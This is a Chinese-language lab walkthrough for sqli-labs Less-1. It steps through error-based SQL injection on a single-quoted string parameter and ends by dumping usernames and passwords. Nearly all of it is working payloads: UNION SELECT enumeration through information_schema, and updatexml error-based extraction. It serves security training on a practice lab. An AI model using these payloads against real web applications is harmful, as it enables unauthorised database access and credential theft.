# Less-1 Error based - Single qutos - String

输入单引号访问，报错，显示为MySQL数据库

?id=1'

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824059963-a3a0be35-2caf-4596-91dc-75764fad9d7d.png)

利用布尔表达式和注释，正常显示

?id=1' or 1=1 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824117313-3ee085e8-ebef-4969-ab6d-53a6d6c90ee0.png)

通过order by猜测字段数，最后猜测到4的时候报错，字段数为3

?id=1' order by 4--+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824194148-df5e8fc5-6bd9-4b26-a8a8-13c52bbd4afc.png)

通过union联合查询，并将id设置为不存在的-1，查看回显，确定哪一列可以被显示输出

?id=-1' union select 1,2,3 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824279758-3b4f0bad-a2e3-4961-a930-36d0c67225c0.png)

通过MySQL的内置函数，查看当前数据库名称

?id=-1' union select 1,database(),3 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824346974-da30a265-1fba-4088-9c8e-f7dd55a28198.png)

通过information_schema数据库的tables表，查询当前数据库的表名，用group_concat函数连接输出

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824526524-3d311a07-93bb-47f1-9fb5-829f0f153f75.png)

通过information_schema数据库的columns表，查询可疑数据库users表的字段名

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824605234-772f62ba-422a-4a1a-8858-75af6b552662.png)

通过已经获取的表名和字段名，进行检索用户名和密码

?id=-1' union select 1,group_concat(username,' ',password),3 from users  --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602824679110-0464a2fe-b3a9-4f68-89ec-6f8b5bc602ae.png)

报错查表

?id=1' and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602908447575-97a0f869-c32e-48d2-8dc4-e17e28a0e9b7.png)

报错查字段

?id=1' and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1) --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602908478675-2c8c7c92-252e-4e2c-a6c1-5553326e27d2.png)

报错探测数据，因为字符限制，用limit查询

?id=1' and updatexml(1, concat(0x7e, (select concat(username,' ',password) from users limit 0,1),0x7e),1) --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602908675042-d637ae42-9daf-45f3-a0ee-7796d54e83aa.png)